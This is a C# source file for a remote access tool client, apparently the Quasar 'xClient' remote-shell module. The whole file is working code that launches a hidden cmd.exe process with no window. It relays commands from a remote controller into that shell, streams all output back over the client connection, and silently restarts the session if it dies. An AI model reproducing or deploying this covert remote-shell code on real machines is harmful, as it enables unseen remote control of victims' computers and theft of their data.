using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace xClient.Core.RemoteShell
{
    public class Shell : IDisposable
    {
        private Process _prc;
        private bool _read;

        private void CreateSession()
        {
            _read = true;
            _prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    Arguments = "/K"
                }
            };

            _prc.Start();
            new Thread(Redirect).Start();

            Thread.Sleep(100);

            new Packets.ClientPackets.ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(
                Program.ConnectClient);
        }

        private void Redirect()
        {
            try
            {
                using (var reader = _prc.StandardOutput)
                {
                    while (!reader.EndOfStream && _read)
                    {
                        var read = reader.ReadLine();
                        if (read == null) continue;
                        Thread.Sleep(200);
                        new Packets.ClientPackets.ShellCommandResponse(read + Environment.NewLine).Execute(
                            Program.ConnectClient);
                    }
                }

                if ((_prc == null || _prc.HasExited) && _read)
                    throw new ApplicationException("session unexpectedly closed");
            }
            catch (ApplicationException)
            {
                new Packets.ClientPackets.ShellCommandResponse(">> Session unexpectedly closed" + Environment.NewLine)
                    .Execute(Program.ConnectClient);
                CreateSession();
            }
        }

        public bool ExecuteCommand(string command)
        {
            if (_prc == null || _prc.HasExited)
                CreateSession();

            if (_prc == null) return false;

            _prc.StandardInput.WriteLine(command);
            _prc.StandardInput.Flush();

            return true;
        }

        public Shell()
        {
            CreateSession();
        }

        public void Dispose()
        {
            Dispose(true);

            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                try
                {
                    _read = false;
                    if (_prc != null)
                    {
                        if (!_prc.HasExited)
                            _prc.Kill();
                        _prc.Dispose();
                        _prc = null;
                    }
                    GC.SuppressFinalize(this);
                }
                catch
                {
                }
            }
        }
    }
}